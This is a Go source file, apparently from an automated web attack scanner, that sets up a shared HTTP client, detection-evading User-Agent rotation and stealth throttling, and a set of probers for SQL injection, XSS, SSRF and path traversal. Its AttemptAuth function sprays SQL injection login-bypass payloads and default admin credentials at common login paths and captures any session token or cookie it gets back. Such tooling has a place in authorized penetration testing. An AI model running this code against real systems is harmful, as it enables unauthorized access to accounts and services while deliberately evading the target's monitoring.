package probers

import (
	"context"
	"crypto/sha256"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"net/url"
	"strings"
	"sync"
	"time"

	"github.com/borntobeyours/ouroboros/internal/auth"
	"github.com/borntobeyours/ouroboros/internal/throttle"
	"github.com/borntobeyours/ouroboros/pkg/types"
)

// RateLimiter controls request rate to avoid overwhelming targets.
type RateLimiter struct {
	mu       sync.Mutex
	interval time.Duration
	lastReq  time.Time
	count    int64
}

var globalRateLimiter = &RateLimiter{
	interval: 100 * time.Millisecond, // default: 10 req/sec
}

// SetRate configures the global rate limit (requests per second).
// 0 = unlimited.
func SetRate(reqPerSec int) {
	if reqPerSec <= 0 {
		globalRateLimiter.interval = 0
		return
	}
	globalRateLimiter.interval = time.Second / time.Duration(reqPerSec)
}

// GetRequestCount returns total requests made.
func GetRequestCount() int64 {
	globalRateLimiter.mu.Lock()
	defer globalRateLimiter.mu.Unlock()
	return globalRateLimiter.count
}

func (rl *RateLimiter) wait() {
	if rl.interval == 0 {
		rl.mu.Lock()
		rl.count++
		rl.mu.Unlock()
		return
	}
	rl.mu.Lock()
	defer rl.mu.Unlock()
	elapsed := time.Since(rl.lastReq)
	if elapsed < rl.interval {
		time.Sleep(rl.interval - elapsed)
	}
	rl.lastReq = time.Now()
	rl.count++
}

// User-Agent rotation to avoid detection
var userAgents = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:124.0) Gecko/20100101 Firefox/124.0",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0",
}

func randomUA() string {
	return userAgents[rand.Intn(len(userAgents))]
}

// Prober is the interface that all technique-specific probers implement.
type Prober interface {
	Name() string
	Probe(ctx context.Context, target types.Target, endpoints []types.Endpoint) []types.Finding
}

// ProberConfig holds shared configuration for probers.
type ProberConfig struct {
	BaseURL         string
	AuthToken       string // JWT or session token for authenticated scanning
	Client          *http.Client
	BaseFingerprint string // SHA256 prefix of base URL response (SPA detection)
	Classified      *types.ClassifiedEndpoints
	AuthSession     *auth.AuthSession // full auth state (cookies + headers)
}

// currentAuthSession is a package-level auth session set by the engine before
// running probers. It is thread-safe via AuthSession's own mutex.
var currentAuthSession *auth.AuthSession

// globalThrottle is the optional stealth limiter. When set it takes precedence
// over globalRateLimiter for both timing and UA rotation.
var globalThrottle *throttle.Limiter

// extraProbers holds plugin-supplied probers registered at startup.
var extraProbers []Prober

// SetThrottleProfile configures the global stealth throttle using a named profile.
// Call this before running any scans.
func SetThrottleProfile(p throttle.Profile) {
	globalThrottle = throttle.New(p)
}

// SetThrottleRPS configures the global stealth throttle with a custom RPS.
// 0 = unlimited. Jitter is not applied when using this function directly.
func SetThrottleRPS(rps float64) {
	globalThrottle = throttle.NewWithRPS(rps)
}

// RegisterProbers appends additional probers (e.g. from the plugin system) to
// the built-in set. Safe to call before any scan starts.
func RegisterProbers(ps []Prober) {
	extraProbers = append(extraProbers, ps...)
}

// SetPluginProbers replaces the current set of plugin probers with the supplied
// slice.  The engine calls this after recon-based filtering to ensure only
// relevant templates run during the attack phase.
func SetPluginProbers(ps []Prober) {
	extraProbers = ps
}

// SetAuthSession stores the global auth session so all probers pick it up.
func SetAuthSession(s *auth.AuthSession) {
	currentAuthSession = s
}

// GetAuthSession returns the current global auth session (nil if not set).
func GetAuthSession() *auth.AuthSession {
	return currentAuthSession
}

// NewProberConfig creates a ProberConfig from a target.
func NewProberConfig(target types.Target) *ProberConfig {
	cfg := &ProberConfig{
		BaseURL:   strings.TrimRight(target.URL, "/"),
		AuthToken: target.Headers["Authorization"],
		Client: &http.Client{
			Timeout: 10 * time.Second,
			Transport: &http.Transport{
				TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
			},
			CheckRedirect: func(req *http.Request, via []*http.Request) error {
				return http.ErrUseLastResponse
			},
		},
		AuthSession: currentAuthSession, // inherit global auth session
	}
	// If no global session but target has cookies, build a minimal session
	if cfg.AuthSession == nil && len(target.Cookies) > 0 {
		sess := auth.NewAuthSession()
		for k, v := range target.Cookies {
			sess.SetCookie(k, v)
		}
		cfg.AuthSession = sess
	}
	// Fingerprint the base URL for SPA detection
	cfg.BaseFingerprint = cfg.fingerprintURL(cfg.BaseURL)
	return cfg
}

// NewProberConfigWithClassified creates a ProberConfig with classified endpoints.
func NewProberConfigWithClassified(target types.Target, classified *types.ClassifiedEndpoints) *ProberConfig {
	cfg := NewProberConfig(target)
	cfg.Classified = classified
	return cfg
}

// fingerprintURL returns a hash prefix of the response body.
func (c *ProberConfig) fingerprintURL(url string) string {
	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return ""
	}
	resp, err := c.Client.Do(req)
	if err != nil {
		return ""
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 64*1024))
	h := sha256.Sum256(body)
	return fmt.Sprintf("%x", h[:8])
}

// IsSPAResponse checks if a URL returns the same response as the base SPA page.
// If true, it's a SPA catch-all route, NOT a real file/endpoint.
func (c *ProberConfig) IsSPAResponse(url string) bool {
	if c.BaseFingerprint == "" {
		return false
	}
	fp := c.fingerprintURL(url)
	return fp == c.BaseFingerprint
}

// DoRequest sends an HTTP request with rate limiting and UA rotation.
func (c *ProberConfig) DoRequest(method, url string, body io.Reader, headers map[string]string) (int, http.Header, string, error) {
	if globalThrottle != nil {
		globalThrottle.Wait()
	} else {
		globalRateLimiter.wait()
	}

	req, err := http.NewRequest(method, url, body)
	if err != nil {
		return 0, nil, "", err
	}
	ua := randomUA()
	if globalThrottle != nil {
		ua = globalThrottle.NextUserAgent()
	}
	req.Header.Set("User-Agent", ua)
	if c.AuthToken != "" {
		req.Header.Set("Authorization", c.AuthToken)
	}
	for k, v := range headers {
		req.Header.Set(k, v)
	}
	if c.AuthSession != nil {
		c.AuthSession.InjectInto(req)
	}

	resp, err := c.Client.Do(req)
	if err != nil {
		return 0, nil, "", err
	}
	defer resp.Body.Close()

	// Handle rate limit responses (429) with retry
	if resp.StatusCode == 429 {
		retryAfter := resp.Header.Get("Retry-After")
		waitTime := 2 * time.Second
		if retryAfter != "" {
			if d, err := time.ParseDuration(retryAfter + "s"); err == nil {
				waitTime = d
			}
		}
		time.Sleep(waitTime)
		// Retry once
		resp.Body.Close()
		req2, _ := http.NewRequest(method, url, body)
		req2.Header.Set("User-Agent", randomUA())
		if c.AuthToken != "" {
			req2.Header.Set("Authorization", c.AuthToken)
		}
		for k, v := range headers {
			req2.Header.Set(k, v)
		}
		if c.AuthSession != nil {
			c.AuthSession.InjectInto(req2)
		}
		resp, err = c.Client.Do(req2)
		if err != nil {
			return 0, nil, "", err
		}
		defer resp.Body.Close()
	}

	respBody, _ := io.ReadAll(io.LimitReader(resp.Body, 64*1024))
	return resp.StatusCode, resp.Header, string(respBody), nil
}

// DoRequestRaw sends a request and returns the raw response.
func (c *ProberConfig) DoRequestRaw(method, url string, body io.Reader, headers map[string]string) (*http.Response, error) {
	req, err := http.NewRequest(method, url, body)
	if err != nil {
		return nil, err
	}
	if c.AuthToken != "" {
		req.Header.Set("Authorization", c.AuthToken)
	}
	for k, v := range headers {
		req.Header.Set(k, v)
	}
	if c.AuthSession != nil {
		c.AuthSession.InjectInto(req)
	}
	return c.Client.Do(req)
}

// MakeFinding is a helper to create a finding with common fields.
func MakeFinding(title, severity, desc, endpoint, method, cwe, poc, evidence, technique string, loop int) types.Finding {
	sev, _ := types.ParseSeverity(severity)
	f := types.Finding{
		Title:       title,
		Description: desc,
		Severity:    sev,
		Endpoint:    endpoint,
		Method:      method,
		CWE:         cwe,
		PoC:         poc,
		Evidence:    evidence,
		Technique:   technique,
		Confirmed:   true,
		FoundAt:     time.Now(),
		Loop:        loop,
	}
	f.ID = f.Signature()
	return f
}

// AllProbers returns all built-in probers plus any registered plugin probers.
func AllProbers() []Prober {
	builtin := []Prober{
		&SQLiProber{},
		&XSSProber{},
		&IDORProber{},
		&AuthProber{},
		&InfoLeakProber{},
		&InjectionProber{},
		&HeadersProber{},
		&FileUploadProber{},
		&SSRFProber{},
		&PathTraversalProber{},
		&CryptoProber{},
		&AdditionalProber{},
		&GraphQLProber{},
		&WebSocketProber{},
	}
	if len(extraProbers) == 0 {
		return builtin
	}
	all := make([]Prober, 0, len(builtin)+len(extraProbers))
	all = append(all, builtin...)
	all = append(all, extraProbers...)
	return all
}

// RunAllProbers runs every prober against the target and returns combined findings.
func RunAllProbers(ctx context.Context, target types.Target, endpoints []types.Endpoint, classified *types.ClassifiedEndpoints, loop int) []types.Finding {
	// Store classified endpoints in target headers for probers to access via config
	var all []types.Finding
	for _, p := range AllProbers() {
		select {
		case <-ctx.Done():
			return all
		default:
		}
		findings := p.Probe(ctx, target, endpoints)
		for i := range findings {
			findings[i].Loop = loop
			findings[i].ID = findings[i].Signature()
		}
		all = append(all, findings...)
	}
	return all
}

// readOnlyParams are query parameters that are typically read-only cache busters
// or version strings and should NOT be tested for injection.
var readOnlyParams = map[string]bool{
	"ver": true, "v": true, "version": true,
	"cache": true, "cb": true, "t": true, "ts": true,
	"_": true, "nocache": true, "rand": true,
	"hash": true, "etag": true, "rev": true,
	"build": true, "min": true, "minify": true,
}

// IsReadOnlyParam checks if a query parameter is a known read-only/cache buster.
func IsReadOnlyParam(param string) bool {
	return readOnlyParams[strings.ToLower(param)]
}

// IsStaticAssetURL checks if a URL points to a static asset (JS, CSS, images, fonts).
func IsStaticAssetURL(u string) bool {
	lower := strings.ToLower(u)
	staticExts := []string{".js", ".css", ".png", ".jpg", ".jpeg", ".gif", ".svg",
		".ico", ".woff", ".woff2", ".ttf", ".eot", ".map"}
	for _, ext := range staticExts {
		if strings.Contains(lower, ext+"?") || strings.HasSuffix(lower, ext) {
			return true
		}
	}
	return false
}

// SetClassifiedEndpoints stores the classified endpoints in a package-level
// variable so probers can access them. This avoids changing the Prober interface.
var currentClassified *types.ClassifiedEndpoints

// RunAllProbersWithClassified runs all probers with classified endpoint context.
func RunAllProbersWithClassified(ctx context.Context, target types.Target, endpoints []types.Endpoint, classified *types.ClassifiedEndpoints, loop int) []types.Finding {
	currentClassified = classified
	defer func() { currentClassified = nil }()
	return RunAllProbers(ctx, target, endpoints, classified, loop)
}

// AttemptAuth tries to authenticate against the target using discovered login endpoints.
// It tries SQLi bypass, default credentials, and common auth patterns.
// Returns the auth token/header value, or empty string if auth fails.
func AttemptAuth(baseURL string, classified *types.ClassifiedEndpoints) (string, error) {
	client := &http.Client{
		Timeout: 10 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}

	base := strings.TrimRight(baseURL, "/")

	// Collect login endpoints from classifier + common fallbacks
	loginURLs := make([]string, 0)
	if classified != nil {
		for _, ep := range classified.Login {
			loginURLs = append(loginURLs, ep.URL)
		}
	}
	// Always try common login paths as fallback
	commonLoginPaths := []string{"/login", "/api/login", "/auth/login", "/api/auth/login",
		"/rest/user/login", "/signin", "/api/signin", "/api/Users/login",
		"/oauth/token", "/api/authenticate"}
	for _, p := range commonLoginPaths {
		u := base + p
		found := false
		for _, existing := range loginURLs {
			if existing == u {
				found = true
				break
			}
		}
		if !found {
			loginURLs = append(loginURLs, u)
		}
	}

	// Phase 1: SQLi bypass payloads (JSON format)
	sqliPayloads := []string{
		`{"email":"' OR 1=1--","password":"anything"}`,
		`{"username":"' OR 1=1--","password":"anything"}`,
		`{"email":"admin'--","password":"anything"}`,
		`{"username":"admin'--","password":"anything"}`,
		`{"email":"' OR '1'='1'--","password":"anything"}`,
	}

	// Phase 2: Default credentials
	defaultCreds := []string{
		`{"email":"admin@admin.com","password":"admin"}`,
		`{"username":"admin","password":"admin"}`,
		`{"email":"admin@admin.com","password":"password"}`,
		`{"username":"admin","password":"password"}`,
		`{"email":"admin@admin.com","password":"admin123"}`,
		`{"username":"admin","password":"admin123"}`,
		`{"email":"test@test.com","password":"test"}`,
		`{"username":"test","password":"test"}`,
	}

	allPayloads := append(sqliPayloads, defaultCreds...)

	for _, loginURL := range loginURLs {
		for _, payload := range allPayloads {
			resp, err := client.Post(loginURL, "application/json", strings.NewReader(payload))
			if err != nil {
				continue
			}
			body, _ := io.ReadAll(resp.Body)
			resp.Body.Close()

			if resp.StatusCode != 200 {
				continue
			}

			bodyStr := string(body)

			// Try to extract token from JSON response
			token := extractAuthToken(bodyStr)
			if token != "" {
				return "Bearer " + token, nil
			}

			// Check Set-Cookie header for session tokens
			cookies := resp.Header.Values("Set-Cookie")
			if len(cookies) > 0 {
				// Return the session cookie as auth
				for _, c := range cookies {
					if strings.Contains(strings.ToLower(c), "session") ||
						strings.Contains(strings.ToLower(c), "token") ||
						strings.Contains(strings.ToLower(c), "auth") {
						return "Cookie:" + c, nil
					}
				}
			}
		}

		// Phase 3: Try form-encoded login
		formPayloads := []url.Values{
			{"username": {"admin"}, "password": {"admin"}},
			{"email": {"admin@admin.com"}, "password": {"admin"}},
			{"username": {"' OR 1=1--"}, "password": {"anything"}},
			{"email": {"' OR 1=1--"}, "password": {"anything"}},
		}

		for _, form := range formPayloads {
			resp, err := client.PostForm(loginURL, form)
			if err != nil {
				continue
			}
			body, _ := io.ReadAll(resp.Body)
			resp.Body.Close()

			if resp.StatusCode != 200 {
				continue
			}

			bodyStr := string(body)
			token := extractAuthToken(bodyStr)
			if token != "" {
				return "Bearer " + token, nil
			}

			cookies := resp.Header.Values("Set-Cookie")
			for _, c := range cookies {
				if strings.Contains(strings.ToLower(c), "session") ||
					strings.Contains(strings.ToLower(c), "token") ||
					strings.Contains(strings.ToLower(c), "auth") {
					return "Cookie:" + c, nil
				}
			}
		}
	}

	return "", fmt.Errorf("authentication failed against %d login endpoints", len(loginURLs))
}

// extractAuthToken tries to find a JWT or auth token in a JSON response body.
func extractAuthToken(body string) string {
	// Try common JSON token field names
	tokenFields := []string{"token", "access_token", "accessToken", "jwt",
		"id_token", "auth_token", "authToken", "session_token", "sessionToken"}

	// Quick JSON parse
	var data map[string]interface{}
	if err := json.Unmarshal([]byte(body), &data); err != nil {
		// Try to find token with string scanning as fallback
		for _, field := range tokenFields {
			pattern := fmt.Sprintf(`"%s":"`, field)
			if idx := strings.Index(body, pattern); idx >= 0 {
				start := idx + len(pattern)
				end := strings.Index(body[start:], `"`)
				if end > 0 {
					token := body[start : start+end]
					if len(token) > 10 { // reasonable token length
						return token
					}
				}
			}
		}
		return ""
	}

	// Search top-level and one level deep (e.g., {"authentication":{"token":"..."}})
	for _, field := range tokenFields {
		if val, ok := data[field]; ok {
			if s, ok := val.(string); ok && len(s) > 10 {
				return s
			}
		}
	}

	// Check nested objects
	for _, val := range data {
		if nested, ok := val.(map[string]interface{}); ok {
			for _, field := range tokenFields {
				if v, ok := nested[field]; ok {
					if s, ok := v.(string); ok && len(s) > 10 {
						return s
					}
				}
			}
		}
	}

	return ""
}

func truncate(s string, n int) string {
	if len(s) <= n {
		return s
	}
	return s[:n] + "..."
}

func extractPath(rawURL string) string {
	u, err := url.Parse(rawURL)
	if err != nil {
		return rawURL
	}
	return u.Path
}
